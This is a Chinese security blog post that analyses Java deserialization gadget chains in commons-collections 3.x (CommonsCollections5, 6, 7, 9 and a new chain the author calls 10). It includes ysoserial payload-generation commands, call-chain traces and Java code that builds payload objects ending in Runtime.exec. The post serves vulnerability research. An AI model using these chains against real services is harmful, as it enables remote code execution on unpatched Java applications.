> 原文链接: https://www.anquanke.com//post/id/190468 


# Java反序列化利用链分析之CommonsCollections5,6,7,9,10


                                阅读量   
                                **1046032**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t014e810d5cd76cb132.jpg)](https://p4.ssl.qhimg.com/t014e810d5cd76cb132.jpg)



## 0x00 前言

本文继续分析`CommonsCollections:3.1`的相关反序列化利用链，这次主要分析CommonsCollections5,6,7,9，以及我找的一个新利用链，这里暂且将其称为10.



## 0x01 环境准备

CommonsCollections5,6,7,10用的还是`commons-collections:3.1`，jdk用7或8都可以。<br>
CommonsCollections9适用于3.2.1

```
java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 "open /System/Applications/Calculator.app" &gt; commonscollections5.ser
java -jar ysoserial-master-30099844c6-1.jar CommonsCollections6 "open /System/Applications/Calculator.app" &gt; commonscollections6.ser
java -jar ysoserial-master-30099844c6-1.jar CommonsCollections7 "open /System/Applications/Calculator.app" &gt; commonscollections7.ser
```



## 0x02 利用链分析

### <a class="reference-link" name="1.%20%E8%83%8C%E6%99%AF%E5%9B%9E%E9%A1%BE"></a>1. 背景回顾

前面提到过CommonsCollections1和3在构造AnnotationInvocationHandler时用到了Override.class。但是如果你在jdk8的环境下去载入生成的payload，会发生`java.lang.Override missing element entrySet`的错误。

这个错误的产生原因主要在于jdk8更新了`AnnotationInvocationHandler`[参考](http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/diff/8e3338e7c7ea/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java)

[![](https://p2.ssl.qhimg.com/t012404a6914dc42d96.png)](https://p2.ssl.qhimg.com/t012404a6914dc42d96.png)

jdk8不直接调用`s.defaultReadObject`来填充当前的`AnnotaionInvocationHandler`实例，而选择了单独填充新的变量。

这里我们回顾一下，1和3的payload的触发点是`LazyMap.get`函数，而触发这个函数需要使得`memberValues`为`LazyMap`对象

[![](https://p2.ssl.qhimg.com/t016c4e4576207ea7e2.png)](https://p2.ssl.qhimg.com/t016c4e4576207ea7e2.png)

显然，jdk8的操作使得`memberValues`并不是我们构造好的`LazyMap`类型。在调试中，可以看到此时的`memberValues`为`LinkedHashMap`对象，该对象无法获得`entrySet`的内容，所以会报前面的这个错误。

jdk8下CommonsCollections1和3无法成功利用了，但是如果我们可以找到一个替代AnnotationInvocationHandler的利用方式呢？这就是本文要讲的CommonsCollections5，6，7所做出的改变。

### <a class="reference-link" name="2.%20%E9%87%8D%E6%96%B0%E6%9E%84%E9%80%A0%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86%E5%88%A9%E7%94%A8%E9%93%BE%E2%80%94CommonsCollections5"></a>2. 重新构造前半部分利用链—CommonsCollections5

CommonsCollections5与1的区别在于AnnotationInvocationHandler，后部分是相同的，所以这里不分析后部分。

AnnotationInvocationHandler在前面起到的作用是来触发LazyMap.get函数，所以我们接下来就是要重新找一个可以触发该函数的对象。这个对象满足
- 类可序列化，类属性有个可控的Map对象或Object
- 该类的类函数上有调用这个Map.get的地方
CommonsCollections5在这里用到了TiedMapEntry，来看一下

[![](https://p2.ssl.qhimg.com/t01b3786ab0cb3d2c59.png)](https://p2.ssl.qhimg.com/t01b3786ab0cb3d2c59.png)

TiedMapEntry有一个map类属性，且在getValue处调用了map.get函数。同时toString、hashCode、equals均调用了getValue函数，这里关注toString函数。

[![](https://p1.ssl.qhimg.com/t01a57a3747d305ee76.png)](https://p1.ssl.qhimg.com/t01a57a3747d305ee76.png)

toString函数通常在与字符串拼接时，会被自动调用。那么接下来我们需要找一个对象满足
- 类可序列化，类属性有个Map.Entry对象或Object
- 该类会自动调用这个类属性的toString函数或前面的另外几种
这里选择了`BadAttributeValueExpException`对象，他的`readObject`函数会自动调用类属性的`toString`函数。

[![](https://p5.ssl.qhimg.com/t01c6b067dde1d106d5.png)](https://p5.ssl.qhimg.com/t01c6b067dde1d106d5.png)

需要注意的是这里`System.getSecurityManager`为空，换句话说，就是当前的jvm环境不能启用安全管理器。

来看一下一整个调用链

```
BadAttributeValueExpException.readObject()
    -&gt; valObj.toString() =&gt; TiedMapEntry.getValue
    -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()
    -&gt; factory.transform() =&gt; ChainedTransformer.transform()
    -&gt; 前文构造的Runtime.getRuntime().exec()
```

### <a class="reference-link" name="3.%20%E9%87%8D%E6%96%B0%E6%9E%84%E9%80%A0%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86%E5%88%A9%E7%94%A8%E9%93%BE%E2%80%94CommonsCollections6"></a>3. 重新构造前半部分利用链—CommonsCollections6

CommonsCollections6是另一种替换方式，后半部分的利用链还是没有变，不作分析。

我们在2中提到了除了CommonsCollections5用的`toString`外，还有`hashCode`和`equals`函数也调用了getValue函数。那么是否存在调用这两个函数的对象函数呢？答案是肯定的！

CommonsCollections6利用了`TiedMapEntry`的`hashCode`函数，来触发`LazyMap.get`

我们都知道HashSet集合里不会存在相同的key，那么是如何判断是否是相同的key呢？这里就要用到key的hashCode函数了，如果key的值相同，其hashCode返回的值也是相同的。这里的HashCode的计算在HashSet的put和add函数完成，并且HashSet从序列化数据中还原出来时会自动调用put函数，这里就给我们提供了可控的地方。

先来看一下HashSet的`readObject`函数

[![](https://p1.ssl.qhimg.com/t01fff59890f840b494.png)](https://p1.ssl.qhimg.com/t01fff59890f840b494.png)

继续跟put函数，这里其实调用的是HashMap的put函数

[![](https://p5.ssl.qhimg.com/t012460e6fa1d87be6e.png)](https://p5.ssl.qhimg.com/t012460e6fa1d87be6e.png)

其中对key调用的`hash()`函数会调用`key.hashCode`函数，那么现在就很清楚了，我们只要将key的值替换成构造好的`TiedMapEntry`对象就可以了。注意，这里的key值其实就是`HashSet.add`的实例，在HashSet里的HashMap类属性只用到了Key。

整理一下利用链

```
HashSet.readObject()
    -&gt; HashMap.put(key) =&gt; key.hashCode =&gt; TiedMapEntry.hashCode
    -&gt; TiedMapEntry.getValue
    -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()
    -&gt; factory.transform() =&gt; ChainedTransformer.transform()
    -&gt; 前文构造的Runtime.getRuntime().exec()
```

### <a class="reference-link" name="4.%20%E9%87%8D%E6%96%B0%E6%9E%84%E9%80%A0%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86%E5%88%A9%E7%94%A8%E9%93%BE%E2%80%94CommonsCollections7"></a>4. 重新构造前半部分利用链—CommonsCollections7

CommonsCollections7用了Hashtable来代替`AnnotationInvocationHandler`，不同于前面两种CommonsCollections7并未使用`TiredMapEntry`，而是用了相同key冲突的方式调用`equals`来触发`Lazy.get`函数。

先来看一下`Hashtable`的`readObject`函数

[![](https://p5.ssl.qhimg.com/t01c3d8f1504e8fa215.png)](https://p5.ssl.qhimg.com/t01c3d8f1504e8fa215.png)

继续跟进`reconstitutionPut`

[![](https://p4.ssl.qhimg.com/t01f2487126cdd60e58.png)](https://p4.ssl.qhimg.com/t01f2487126cdd60e58.png)

该函数将填充table的内容，其中第1236行仅当有重复数据冲突时，才会进入下面的if语句，这里我们继续跟进`equals`函数

这里的`equals`函数取决于`key`的对象，利用链用的是`LazyMap`对象，实际调用的是父类`AbstractMapDecorator`的`equals`函数

[![](https://p3.ssl.qhimg.com/t0116dc3923c22cfa6e.png)](https://p3.ssl.qhimg.com/t0116dc3923c22cfa6e.png)

这里又调用了map的equals函数，这里实际调用的是HashMap的父类`AbstractMap`的`equals`函数

[![](https://p2.ssl.qhimg.com/t01aabd42b0e89bbe76.png)](https://p2.ssl.qhimg.com/t01aabd42b0e89bbe76.png)

在第495行调用了`m.get`函数，所以后面又是我们熟悉的`LazyMap.get`的套路了。

整理一下利用链

```
Hashtable.readObject()
    -&gt; Hashtable.reconstitutionPut
    -&gt; LazyMap.equals =&gt; AbstractMapDecorator.equals =&gt; AbstractMap.equals
    -&gt; m.get() =&gt; LazyMap.get()
    -&gt; factory.transform() =&gt; ChainedTransformer.transform()
    -&gt; 前文构造的Runtime.getRuntime().exec()
```

### <a class="reference-link" name="5.%20%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0"></a>5. 利用链构造

CommonsCollections6和7的exp构造比较复杂，这里单独拿出来讲一下。

<a class="reference-link" name="CommonsCollections6"></a>**CommonsCollections6**

经过前面的分析，我们可以知道CommonsCollections6需要将构造好的TiedMapEntry实例添加到HashSet的值上。

简单的方法就是直接add

```
TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
HashSet map = new HashSet(1);
map.add(entry);
```

复杂一点，就是ysoserail里的实现方法，采用反射机制来完成

其思路主要为：
- 实例化一个HashSet实例
- 通过反射机制获取HashSet的map类属性
- 通过反射机制获取HashMap(map类属性)的table(Node&lt;K,V&gt;)类属性
- 通过反射机制获取Node的key类属性，并设置该key的值为构造好的TiedMapEntry实例
具体代码如下

```
HashSet map = new HashSet(1);
map.add("foo");
Field f = null;
try `{`
    f = HashSet.class.getDeclaredField("map");//获取HashSet的map Field对象
`}` catch (NoSuchFieldException e) `{`
    f = HashSet.class.getDeclaredField("backingMap");
`}`
Permit.setAccessible(f);// 设置map可被访问修改
HashMap innimpl = null;
innimpl = (HashMap) f.get(map);// 获取map实例的map类属性

Field f2 = null;
try `{`
  f2 = HashMap.class.getDeclaredField("table");// 获取HashMap的 table field
`}` catch (NoSuchFieldException e) `{`
  f2 = HashMap.class.getDeclaredField("elementData");
`}`
Permit.setAccessible(f2);// 设置HashMap的field 可被访问
Object[] array = new Object[0];
array = (Object[]) f2.get(innimpl);
Object node = array[0];// 获取Node&lt;k,v&gt;实例
if(node == null)`{`
  node = array[1];
`}`

Field keyField = null;
try`{`
  keyField = node.getClass().getDeclaredField("key");// 获取Node的key field
`}`catch(Exception e)`{`
  keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
`}`
Permit.setAccessible(keyField);// 设置该Field可被访问修改
keyField.set(node, entry);// 对node实例填充key的值为TiedMapEntry实例
```

经过上面的操作，最终的HashSet实例被我们嵌入了构造好的TiedMapEntry实例。

这里在调试的过程中，发现用ysoserail的Reflections来简化exp，出来的结果有点不一样，还没有找到具体的原因。如果有师傅遇到过这种问题，欢迎一起讨论讨论！

<a class="reference-link" name="CommonsCollections7"></a>**CommonsCollections7**

CommonsCollections利用的是key的hash冲突的方法来触发`equals`函数，该函数会调用`LazyMap.get`函数

那么构造exp的关键就是构造一个hash冲突的LazyMap了。

这里大家可以跟一下String.hashCode函数，他的计算方法存在不同字符串相同hash的可能性，例如如下代码

[![](https://p3.ssl.qhimg.com/t0178a9ea5c6346ed24.png)](https://p3.ssl.qhimg.com/t0178a9ea5c6346ed24.png)

CommonsCollections7用的就是这个bug来制造hash冲突。

这里需要提一点的是触发LazyMap.get函数

[![](https://p0.ssl.qhimg.com/t016651d6f6baa1b908.png)](https://p0.ssl.qhimg.com/t016651d6f6baa1b908.png)

要走到第151行红框框上，首先需要满足的是`map`里不存在当前这个`key`

但是明显在第一次不存在这个`key`后，会更新`map`的键值，这将导致下次同样的`key`进来，就不会触发后续的payload了。我们在写exp的时候需要注意到这一点。

来看一下ysoserial的CommonsCollections7是怎么编写的！

```
Map innerMap1 = new HashMap();
Map innerMap2 = new HashMap();

// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
lazyMap1.put("yy", 1);

Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
lazyMap2.put("zZ", 1);

// Use the colliding Maps as keys in Hashtable
Hashtable hashtable = new Hashtable();
hashtable.put(lazyMap1, 1);
hashtable.put(lazyMap2, 2);

Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
// Needed to ensure hash collision after previous manipulations
lazyMap2.remove("yy");
```

其中第两次的put会使得会使得LazyMap2中增加了yy这个键值，为了保证反序列化后仍然可以触发后续的利用链，这里需要将lazyMap2的yy键值remove掉。

### <a class="reference-link" name="6.%20%E6%9E%84%E9%80%A0%E6%96%B0CommonsCollections10"></a>6. 构造新CommonsCollections10

经过对前面1,3,5,6,7的分析，我们其实可以发现很多payload都是“杂交”的成果。那么我们是否能根据前面的分析，构造出一个新的CommonsCollections的payload呢？答案当然是肯定的，接下来讲一下我找到的一个新payload利用。

这个payload为CommonsCollections6和7的结合，同CommonsCollections6类似，这里也用到了`TiedMapEntry`的`hashCode`函数

我们在分析`Hashtable`的`reconstitutionPut`函数时，看下图

[![](https://p1.ssl.qhimg.com/t0115f4d14a970276a9.png)](https://p1.ssl.qhimg.com/t0115f4d14a970276a9.png)

该函数在第1234行对`key`调用了一次`hashCode`函数，那么很明显，如果key值被代替为构造好的`TiedMapEntry`实例，这里我们就能触发`LazyMap.get`函数，后续的调用链就类似了。

整理一下利用链

```
Hashtable.readObject()
    -&gt; Hashtable.reconstitutionPut
    -&gt; key.hashCode() =&gt; TiedMapEntry.hashCode()
    -&gt; TiedMapEntry.getValue
    -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()
    -&gt; factory.transform() =&gt; ChainedTransformer.transform()
    -&gt; 前文构造的Runtime.getRuntime().exec()
```

其实从利用链来看，与CommonsCollections6的区别在于前部的触发使用了不同的对象。

接下来，结合第5点的学习，我们来写一下这个payload的利用链exp

```
final Transformer transformerChain = new ChainedTransformer(new Transformer[]`{``}`);

final Map innerMap = new HashMap();
final Map innerMap2 = new HashMap();

final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
Hashtable hashtable = new Hashtable();
hashtable.put("foo",1);
// 获取hashtable的table类属性
Field tableField = Hashtable.class.getDeclaredField("table");
Permit.setAccessible(tableField);
Object[] table = (Object[])tableField.get(hashtable);
Object entry1 = table[0];
if(entry1==null)
    entry1 = table[1];
// 获取Hashtable.Entry的key属性
Field keyField = entry1.getClass().getDeclaredField("key");
Permit.setAccessible(keyField);
// 将key属性给替换成构造好的TiedMapEntry实例
keyField.set(entry1, entry);
// 填充真正的命令执行代码
Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
return hashtable;
```

### <a class="reference-link" name="7.%20%E6%A2%85%E5%AD%90%E9%85%92%E5%B8%88%E5%82%85%E7%9A%84CommonsCollections9"></a>7. 梅子酒师傅的CommonsCollections9

找到上面CommonsCollections10时，在网上找了一下有没有师傅已经挖到过了，一共找到下面几位师傅
- [https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java](https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java)
- [https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d](https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d)
- [https://github.com/frohoff/ysoserial/pull/116](https://github.com/frohoff/ysoserial/pull/116)
一个一个来说
1. 第一个[Jayl1n](https://github.com/Jayl1n)师傅做的改变主要是最终的Runtime.getRuntime().exec改成了URLClassLoader.loadClass().newInstance的方式，前面用的还是CommonsCollections6，这里暂时不将其归类为新的利用链。
1. 第二个是**[梅子酒](https://github.com/meizjm3i)**师傅提交的CommonsCollections9，主要利用的是CommonsCollections:3.2版本新增的`DefaultedMap`来代替`LazyMap`，因为这两个Map有同样的get函数可以被利用，这里不再具体分析。
1. 第三个是**[navalorenzo](https://github.com/navalorenzo)**师傅提交的CommonsCollections8，其利用链基于CommonsCollections:4.0版本，暂时不在本篇文章的分析范围内，后面会好好分析一下。


## 0x03 总结

联合前面两篇文章[CommonsCollections1](http://blog.0kami.cn/2019/10/24/study-java-deserialized-vulnerability/)、[CommonsCollections3](http://blog.0kami.cn/2019/10/28/study-java-deserialized-commonscollections3/)，在加上本文的CommonsCollections5，6，7，9，10。

由于网上已经有类似的文章做了[总结](https://www.freebuf.com/articles/web/214096.html)，这里就简单做一下`CommonsCollections&lt;=3.2.1`下的反序列化利用链的总结。
<li>起始点
<ol>
<li>
`AnnotationInvocationHandler`的`readObject`
</li>
<li>
`BadAttributeValueExpException`的`readObject`
</li>
<li>
`HashSet`的`readObject`
</li>
<li>
`Hashtable`的`readObject`
</li>
</ol>
</li>
<li>重要的承接点
<ol>
<li>
`LazyMap`的`get`
</li>
<li>
`DefaultedMap`的`get`
</li>
<li>
`TiedMapEntry`的`getValue`
</li>
<li>
`Proxy`的`invoke`
</li>
</ol>
</li>
<li>终点
<ol>
<li>
`ChainedTransformer`的`transform`
</li>
<li>
`InvokerTransformer`的`transform`
</li>
<li>
`ConstantTransformer`的`transform`
</li>
</ol>
</li>
各exp的jdk适用版本
1. jdk7 =&gt; CommonsCollection1、3
1. jdk7 &amp; jdk8 =&gt; CommonsCollections5,6,7,9,10
各exp的commons-collections适用版本
1. commons-collections&lt;=3.1 CommonsCollections1,3,5,6,7,10
1. commons-collections&lt;=3.2.1 CommonsCollections1,3,5,6,7,9,10
最后的最后，commons-collections:3.x版本的反序列化利用链就分析到这里，其实我相信如果想继续挖可代替的利用链还是会有的，就像本文挖到的CommonsCollections10，如果各位师傅有兴趣可以继续挖下去，也欢迎和各位师傅一起交流。

后续还会把commons-collections:4版本的利用链做一个分析，欢迎一起交流：）

<a class="reference-link" name="commons-collections:3.2.2%E5%8F%8A%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC%E7%9A%84%E6%94%B9%E5%8F%98"></a>**commons-collections:3.2.2及以上版本的改变**

前面的分析并没有提到3.2.2版本发生了啥事，导致了利用链的失效，这里简单提一下

[![](https://p3.ssl.qhimg.com/t0135afbec793446240.png)](https://p3.ssl.qhimg.com/t0135afbec793446240.png)

3.2.2版本对InvokerTransformer增加了readObject函数，并且做了是否允许反序列化的检查，在`FunctorUtils.checkUnsafeSerialization`函数内。

[![](https://p2.ssl.qhimg.com/t01eee470f626eda79e.png)](https://p2.ssl.qhimg.com/t01eee470f626eda79e.png)

这里UNSAFE_SERIALIZABLE_PROPERTY的值默认为false，如果需要为true，需要在运行时指定。

所以在使用InvokerTransformer作为反序列化利用链的一部分时，会throw一个exception。除了InvokerTransformer类外，还有CloneTransformer, ForClosure, InstantiateFactory, InstantiateTransformer, InvokerTransformer,<br>
PrototypeCloneFactory, PrototypeSerializationFactory, WhileClosure。所以在3.2.2版本以上，基本上利用链都已经废了。

当然，这种方法治标不治本，如果可以在这些类以外，构造一个利用链同样可以达到前面的效果。

[![](https://p0.ssl.qhimg.com/t014651eec75e98d5a4.jpg)](https://p0.ssl.qhimg.com/t014651eec75e98d5a4.jpg)
